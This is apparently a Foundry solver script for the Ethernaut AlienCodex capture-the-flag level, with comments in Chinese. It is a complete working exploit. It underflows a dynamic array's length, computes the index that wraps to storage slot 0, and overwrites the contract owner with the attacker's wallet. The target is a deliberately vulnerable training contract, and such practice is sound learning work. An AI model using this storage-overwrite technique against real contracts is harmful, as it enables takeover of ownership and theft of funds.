// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Solver is Script {
    address allien_codex = vm.envAddress("ALIENCODEX_INSTANCE");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        // 使 slot1 的值等於 keccak256(1))
        allien_codex.call(abi.encodeWithSignature("makeContact()"));
        allien_codex.call(abi.encodeWithSignature("retract()"));
        
        // 取得: codex 的第一個元素所佔用的 Storage Slot Number
        bytes32 slot_index_of_first_element_of_codex = keccak256(abi.encode(uint256(1)));

        // 取得: 對於 codex 來說，index 需要多少偏移量才能達到 Storage Slot 0
        bytes32 max_bytes32 = bytes32(type(uint256).max);
        bytes32 array_index_that_occupied_the_slotMAX = bytes32(uint256(max_bytes32) - uint256(slot_index_of_first_element_of_codex));

        // 檢查: codex 的第一個元素，佔用的 Storage Slot Number 加上偏移量，應該要等於 0xffff....ffff
        assert(uint256(slot_index_of_first_element_of_codex) + uint256(array_index_that_occupied_the_slotMAX) == type(uint256).max);

        allien_codex.call(abi.encodeWithSignature("revise(uint256,bytes32)", uint256(array_index_that_occupied_the_slotMAX)+1, bytes32(abi.encode(vm.envAddress("MY_EOA_WALLET")))));


        vm.stopBroadcast();
    }
}